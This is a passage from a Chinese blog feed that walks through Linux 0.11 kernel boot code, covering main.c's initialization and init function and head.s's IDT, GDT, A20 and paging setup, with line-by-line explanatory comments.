循环读取时钟信息，将误差锁定在 1s 内</span></span><br><span class="line">BCD_TO_BIN(time.tm_sec);<span class="comment">// 读出来都是 BCD 码，转成二进制数值</span></span><br><span class="line">BCD_TO_BIN(time.tm_min);</span><br><span class="line">BCD_TO_BIN(time.tm_hour);</span><br><span class="line">BCD_TO_BIN(time.tm_mday);</span><br><span class="line">BCD_TO_BIN(time.tm_mon);</span><br><span class="line">BCD_TO_BIN(time.tm_year);</span><br><span class="line">time.tm_mon--;<span class="comment">// 让月份范围从 1 ~ 12 减为 0 ~ 11</span></span><br><span class="line">startup_time = kernel_mktime(&amp;time);<span class="comment">// 计算开机时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>outb_p 与 inb_p 定义在 include/asm/io.h 中，分别表示向 io 端口输出信息及从 io 端口读取信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/asm/io.h Line 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> outb_p(value,port) \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="meta-string">&quot;outb %%al,%%dx\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;\tjmp 1f\n&quot;</span> \<span class="comment">// jmp 1f 相当于 nop</span></span></span><br><span class="line"><span class="string">&quot;1:\tjmp 1f\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;1:&quot;</span>::<span class="string">&quot;a&quot;</span> (value),<span class="string">&quot;d&quot;</span> (port))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inb_p(port) (&#123; \</span></span><br><span class="line"><span class="meta">unsigned char _v; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="meta-string">&quot;inb %%dx,%%al\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;\tjmp 1f\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;1:\tjmp 1f\n&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;1:&quot;</span>:<span class="meta-string">&quot;=a&quot;</span> (_v):<span class="meta-string">&quot;d&quot;</span> (port)); \</span></span><br><span class="line"><span class="meta">_v; \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>main 之前最后还定义了一些用于内存划分的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 98</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> memory_end = <span class="number">0</span>;<span class="comment">// 机器的物理内存容量</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> buffer_memory_end = <span class="number">0</span>;<span class="comment">// 高速缓冲区末端地址</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> main_memory_start = <span class="number">0</span>;<span class="comment">// 主内存开始位置</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">drive_info</span> &#123;</span> <span class="keyword">char</span> dummy[<span class="number">32</span>]; &#125; drive_info;<span class="comment">// 存放硬盘参数表信息</span></span><br></pre></td></tr></table></figure><p>main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 104</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ROOT_DEV = ORIG_ROOT_DEV;<span class="comment">// 存储根设备号</span></span><br><span class="line"> drive_info = DRIVE_INFO;<span class="comment">// 存储硬盘参数表</span></span><br><span class="line">memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);<span class="comment">// 内存大小 = 1MB + 扩展内存大小 * 1024</span></span><br><span class="line">memory_end &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 4K 对齐</span></span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">// 内存大小超过 16 MB，限制为 16 MB</span></span><br><span class="line">memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">// 内存大小在 12 ~ 16 MB 之间，缓冲区末端 = 4 MB </span></span><br><span class="line">buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">// 内存大小在 6 ~ 12 之间，缓冲区末端 = 2 MB</span></span><br><span class="line">buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;<span class="comment">// 小于等于 6 MB，缓冲区末端 = 1 MB</span></span><br><span class="line">main_memory_start = buffer_memory_end;<span class="comment">// 主内存区域起始位置设置为缓冲区结束位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RAMDISK<span class="comment">// 如果定义了 RAMDISK，则初始化虚拟盘</span></span></span><br><span class="line">main_memory_start += rd_init(main_memory_start, RAMDISK*<span class="number">1024</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">mem_init(main_memory_start,memory_end);<span class="comment">// 主内存初始化</span></span><br><span class="line">trap_init();<span class="comment">// 陷阱门初始化</span></span><br><span class="line">blk_dev_init();<span class="comment">// 块设备初始化</span></span><br><span class="line">chr_dev_init();<span class="comment">// 字符设备初始化</span></span><br><span class="line">tty_init();<span class="comment">// tty 初始化</span></span><br><span class="line">time_init();<span class="comment">// 获取时间，设置开机启动时间</span></span><br><span class="line">sched_init();<span class="comment">// 进程调度程序初始化</span></span><br><span class="line">buffer_init(buffer_memory_end);<span class="comment">// 缓冲区管理初始化</span></span><br><span class="line">hd_init();<span class="comment">// 硬盘初始化</span></span><br><span class="line">floppy_init();<span class="comment">// 软驱初始化</span></span><br><span class="line">sti();<span class="comment">// 初始化完成，开启之前被屏蔽的中断</span></span><br><span class="line">move_to_user_mode();<span class="comment">// 转移到用户态</span></span><br><span class="line"><span class="keyword">if</span> (!fork()) &#123;<span class="comment">// 先生成一个子进程 1，继续往下执行</span></span><br><span class="line">init();<span class="comment">// 在进程 1 中继续初始化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(;;) pause();<span class="comment">// pause 调用进程调度函数，切换回进程 1 执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前有说过 pause 的进程需等待一个信号才能被激活，进程 0 是个例外，当没有其他进程在运行时，会激活进程 0</p><p>接下来声明了一个 printf 函数，为 init 中输出信息做准备，并设置了一些配置文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 152</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><span class="comment">// 在屏幕上打印字符</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">va_list args;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">va_start(args, fmt);</span><br><span class="line">write(<span class="number">1</span>,printbuf,i=<span class="built_in">vsprintf</span>(printbuf, fmt, args));</span><br><span class="line">va_end(args);</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 读取执行 /etc/rc 文件使用的命令行参数及环境参数</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * argv_rc[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;<span class="comment">// 命令行参数数组</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * envp_rc[] = &#123; <span class="string">&quot;HOME=/&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;<span class="comment">// 环境数组</span></span><br><span class="line"><span class="comment">// 运行登录 shell 使用的命令行参数及环境参数</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * argv[] = &#123; <span class="string">&quot;-/bin/sh&quot;</span>,<span class="literal">NULL</span> &#125;;<span class="comment">// 命令行参数数组</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * envp[] = &#123; <span class="string">&quot;HOME=/usr/root&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;<span class="comment">// 环境数组</span></span><br></pre></td></tr></table></figure><p>进程 1 执行的 init 函数，该函数首先对第一个将要执行的 shell 程序的环境进行初始化，然后以登录 shell 的方式加载并执行。如果运行登录 shell 的进程结束了，进程 1 又会重新新建一个进程，继续运行登录 shell。这里的登录 shell 指的就是开机完成用户可以键入用户名密码登录系统的 shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 169</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid,i;</span><br><span class="line"></span><br><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);<span class="comment">// 读取硬盘参数，安装根文件系统设备，加载虚拟盘</span></span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);<span class="comment">// 以读写访问方式打开设备 /dev/tty0，句柄为 0(stdin)</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);<span class="comment">// 复制句柄 0，产生 1 号句柄，用于标准输出(stdout)</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);<span class="comment">// 复制句柄 0，产生 2 号句柄，用于标准出错输出(stderr)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d buffers = %d bytes buffer space\n\r&quot;</span>,NR_BUFFERS,</span><br><span class="line">NR_BUFFERS*BLOCK_SIZE);<span class="comment">// 打印缓冲区块数，总字节数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free mem: %d bytes\n\r&quot;</span>,memory_end-main_memory_start);<span class="comment">// 打印主内存空闲内存字节数</span></span><br><span class="line"><span class="keyword">if</span> (!(pid=fork())) &#123;<span class="comment">// 新建进程 2(作为进程 1 的子进程)</span></span><br><span class="line">close(<span class="number">0</span>);<span class="comment">// 关闭标准输入流</span></span><br><span class="line"><span class="keyword">if</span> (open(<span class="string">&quot;/etc/rc&quot;</span>,O_RDONLY,<span class="number">0</span>))<span class="comment">//立即打开 /etc/rc 将 stdin 重定向到 /etc/rc 文件</span></span><br><span class="line">_exit(<span class="number">1</span>);</span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,argv_rc,envp_rc);<span class="comment">// 执行 /bin/sh，从 /etc/rc 读入命令并执行</span></span><br><span class="line">_exit(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)<span class="comment">// 以下是父进程执行的代码，&amp;i 是存放返回信息的位置</span></span><br><span class="line"><span class="keyword">while</span> (pid != wait(&amp;i))<span class="comment">// 父进程（进程 1）等待进程 2 运行结束，环境初始化完毕</span></span><br><span class="line"><span class="comment">/* nothing */</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((pid=fork())&lt;<span class="number">0</span>) &#123;<span class="comment">// 创建进程 n，作为登录 shell</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fork failed in init\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!pid) &#123;<span class="comment">// 进程 n 执行的代码部分</span></span><br><span class="line">close(<span class="number">0</span>);close(<span class="number">1</span>);close(<span class="number">2</span>);<span class="comment">// 关闭以前遗留的三个标准流句柄</span></span><br><span class="line">setsid();<span class="comment">// 创建新的会话</span></span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);<span class="comment">// 重新打开 /dev/tty0 作为 stdin</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);<span class="comment">// stdout</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);<span class="comment">// stderr</span></span><br><span class="line">_exit(execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp));<span class="comment">// 打开登录 shell</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">// 对于进程 1，等待进程 n(登录 shell) 运行结束</span></span><br><span class="line"><span class="keyword">if</span> (pid == wait(&amp;i))</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">// 子进程 n 结束了，进程 1 又会回到上面新建一个进程运行登录 shell</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\rchild %d died with code %04x\n\r&quot;</span>,pid,i);</span><br><span class="line">sync();<span class="comment">// 同步，刷新缓冲区</span></span><br><span class="line">&#125;</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--引导启动部分（三）</title>
      <link href="/2020/03/22/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/03/22/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>head.s 的作用是重新设置 IDT 和 GDT，检查 A20 是否已经开启，并设置页目录表及页表，最后跳转到 init/main.c。需要注意的是，该程序使用的是 AT&amp;T 汇编语法格式</p><p>在 setup.s 处理结束后，内存分布是这样的：</p><p><img src="../img/h1.png" alt="内存分布"></p><p>head.s 的任务完成后，内存会变成这样：</p><p><img src="../img/h2.png" alt="内存分布"></p><p>看完程序再回过头来看这张图就会明白了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/* Line 14 */</span><br><span class="line">.text</span><br><span class="line">.globl idt,gdt,pg_dir,tmp_floppy_area/* 声明外部或全局变量 */</span><br><span class="line">pg_dir:/* 稍后页目录会从这里开始覆盖前半段程序 */</span><br><span class="line">.globl startup_32</span><br><span class="line">startup_32:</span><br><span class="line">movl $0x10,%eax/* 段选择子 0b0000 0000 0001 0000，指向 GDT 第三个描述符 */</span><br><span class="line">mov %ax,%ds/* 描述符在 setup.s 第 213 行，将物理起始地址描述为数据段 */</span><br><span class="line">mov %ax,%es/* 将这个段选择子载入各个段寄存器 */</span><br><span class="line">mov %ax,%fs</span><br><span class="line">mov %ax,%gs</span><br><span class="line">lss stack_start,%esp/* 加载堆栈段指针，stack_start 符号定义在 kernel/sched.c 中 */</span><br><span class="line">call setup_idt/* 重新设置 IDT */</span><br><span class="line">call setup_gdt/* 重新设置 GDT */</span><br><span class="line">movl $0x10,%eax/* 修改 GDT 后重新加载一遍段寄存器及堆栈段指针 ss:esp */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">mov %ax,%fs</span><br><span class="line">mov %ax,%gs</span><br><span class="line">lss stack_start,%esp</span><br></pre></td></tr></table></figure><p>setup_idt，将 IDT 表 256 个中断描述符都指向 ignore_int 中断服务程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/* Line 79 */</span><br><span class="line">setup_idt:</span><br><span class="line">lea ignore_int,%edx/* edx = 中断服务程序 ignore_int 地址 */</span><br><span class="line">movl $0x00080000,%eax/* 段选择子 0x0008 装入 eax 高 16 位 */</span><br><span class="line">movw %dx,%ax/* ignore_int 地址低 16 位装入 eax 低 16 位 */</span><br><span class="line">movw $0x8E00,%dx/* 此时 edx 为中断门描述符高 4 字节，eax 为低 4 字节 */</span><br><span class="line"></span><br><span class="line">lea idt,%edi/* edi = IDT 地址，此时 IDT 未初始化 */</span><br><span class="line">mov $256,%ecx/* 循环 256 次，对 IDT 每个表项都进行相同的赋值 */</span><br><span class="line">rp_sidt:</span><br><span class="line">movl %eax,(%edi)/* 中断描述符低 4 字节在 eax 中 */</span><br><span class="line">movl %edx,4(%edi)/* 高 4 字节在 edx 中 */</span><br><span class="line">addl $8,%edi/* 加 8 字节指向 IDT 表下一个表项 */</span><br><span class="line">dec %ecx</span><br><span class="line">jne rp_sidt/* 还没有对每一项都初始化，跳回 rp_sidt 继续 */</span><br><span class="line">lidt idt_descr/* 现在 256 项都初始化完成，将 IDT 基址与限长载入 IDTR  */</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">/* Line 224 */</span><br><span class="line">idt_descr:</span><br><span class="line">.word 256*8-1/* IDT 限长 */</span><br><span class="line">.long idt/* IDT 基址 */</span><br><span class="line">/* Line 233 */</span><br><span class="line">.align 8</span><br><span class="line">idt:.fill 256,8,0/* 预留 256 项，每项 8 bytes，用 0 填充 */</span><br></pre></td></tr></table></figure><p>回顾一下中断描述符的结构：</p><p><img src="../img/h3.png" alt="中断描述符"></p><p>ignore_int 中断服务程序的作用只是在屏幕上打印 “Unknown interrupt”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/* Line 148 */</span><br><span class="line">int_msg:</span><br><span class="line">.asciz &quot;Unknown interrupt\n\r&quot;</span><br><span class="line">.align 4</span><br><span class="line">ignore_int:</span><br><span class="line">pushl %eax/* 保存现场 */</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">push %ds/* 虽是 16 位，仍需要 4 字节存储 */</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">movl $0x10,%eax/* 段选择子载入段寄存器，使其指向 GDT 中的数据段 */</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">mov %ax,%fs</span><br><span class="line">pushl $int_msg/* 字符串指针压参 */</span><br><span class="line">call printk/* 调用 kernel/printk.c 中的 printk 函数 */</span><br><span class="line">popl %eax/* 恢复现场 */</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %eax</span><br><span class="line">iret/* 返回 */</span><br></pre></td></tr></table></figure><p>setup_gdt 作用是将原来的 8M 段界限改成 16M：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Line 106 */</span><br><span class="line">setup_gdt:</span><br><span class="line">lgdt gdt_descr/* GDT 的基址与限长(6 bytes)载入 GDTR */</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">/* Line 229 */</span><br><span class="line">gdt_descr:</span><br><span class="line">.word 256*8-1/* 低 2 字节为限长，256 项，每项 8 字节 */</span><br><span class="line">.long gdt/* 高 4 字节为 GDT 基址 */</span><br><span class="line"></span><br><span class="line">/* Line 236 */</span><br><span class="line">gdt:.quad 0x0000000000000000/* 空描述符 */</span><br><span class="line">.quad 0x00c09a0000000fff/* 代码段描述符 */</span><br><span class="line">.quad 0x00c0920000000fff/* 数据段描述符 */</span><br><span class="line">.quad 0x0000000000000000/* 系统调用段描述符 - 未使用 */</span><br><span class="line">.fill 252,8,0/* 预留了 252 项的空间，用于放置新建任务的 LDT 与 TSS 描述符 */</span><br></pre></td></tr></table></figure><p>.quad 指令直接定义 8 个字节的数据</p><p>接着检查 A20 是否开启，先将内存地址 0 处 4 字节赋值 1，再比较内存地址 0x100000(1M) 处的 4 字节与 1 是否相等。如果 A20 没有开启，那么访问 0x100000 就会由于地址回环，回到地址 0，其内容就是 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* Line 33 */</span><br><span class="line">xorl %eax,%eax</span><br><span class="line">1:incl %eax/* eax = 1 */</span><br><span class="line">movl %eax,0x000000/* 给内存起始地址赋值 1 */</span><br><span class="line">cmpl %eax,0x100000/* 访问 1M 处内存，与 1 比较 */</span><br><span class="line">je 1b/* 相等说明 A20 没开，往后跳到标号 1，造成死循环 */</span><br></pre></td></tr></table></figure><p>这里的 1b 表示 向后(backward) 跳到标识符 1，也就是低地址的标识符 1，因为后面的代码里还有一个标识符是 1</p><p>接下来的操作是检查数学协处理器是否存在，先假设其存在并执行协处理器指令， 根据结果判断其是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/* Line 44 */</span><br><span class="line">movl %cr0,%eax/* 取 CR0 */</span><br><span class="line">andl $0x80000011,%eax/* 保存 PG,PE,ET 位 */</span><br><span class="line">orl $2,%eax/* 将 MP 位置位，假设存在数字协处理器 */</span><br><span class="line">movl %eax,%cr0/* 修改 CR0 */</span><br><span class="line">call check_x87/* 检测是否真的存在数字协处理器 */</span><br><span class="line">jmp after_page_tables</span><br><span class="line"></span><br><span class="line">/* Line 55 */</span><br><span class="line">check_x87:</span><br><span class="line">fninit/* 向协处理器发出初始化命令 */</span><br><span class="line">fstsw %ax/* 取协处理器状态字至 ax */</span><br><span class="line">cmpb $0,%al/* 初始化后状态字应为全 0 */</span><br><span class="line">je 1f/* 相等说明存在，向前(高地址)跳到标号 1 */</span><br><span class="line">movl %cr0,%eax/* 否则不存在，修改 CR0 */</span><br><span class="line">xorl $6,%eax/* 0b110，MP 复位，EM 置位 */</span><br><span class="line">movl %eax,%cr0/* 重新给 CR0 赋值 */</span><br><span class="line">ret</span><br><span class="line">.align 4/* 4 字节对齐，提高取指令、访问数据效率 */</span><br><span class="line">1:.byte 0xDB,0xE4/* 80287 协处理器 fsetpm 的机器码，将 287 设置为保护模式，387 忽略 */</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>之后为调用 main 模块做准备，同时设置页目录表和页表，打开分页机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* Line 136 */</span><br><span class="line">after_page_tables:</span><br><span class="line">pushl $0/* 为调用 main 传参 */</span><br><span class="line">pushl $0</span><br><span class="line">pushl $0</span><br><span class="line">pushl $L6/* main 的返回地址 */</span><br><span class="line">pushl $main/* setup_paging 的返回地址 */</span><br><span class="line">jmp setup_paging/* 跳转到 setup_paging */</span><br><span class="line">L6:/* init/main.c 的返回地址，但理论上它不会返回到这里 */</span><br><span class="line">jmp L6/* 加这么一条以防万一，出错时就知道发生什么问题了 */</span><br></pre></td></tr></table></figure><p>setup_paging 将内存 0 ~ 0x0FFF(4K) 设置为页目录表（程序开头的 pg_dir 标识符），并填充前四个表项，同时 0x1000 ~ 0x4FFF 每 0x1000(4K) 设置为对应的四张页表，设置之前先需将这 0x5000 的区域清零</p><p>页目录表为系统所有进程公用，这四张页表为内核专用，它们一一映射线性地址起始 16 MB 的空间到物理内存上（Linus 的机器内存只有 16MB）</p><p>stosl：将 eax 中的值保存到 es:edi 指向的地址中</p><p>页目录表与页表表项结构：<br><img src="../img/h4.png" alt="表项"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 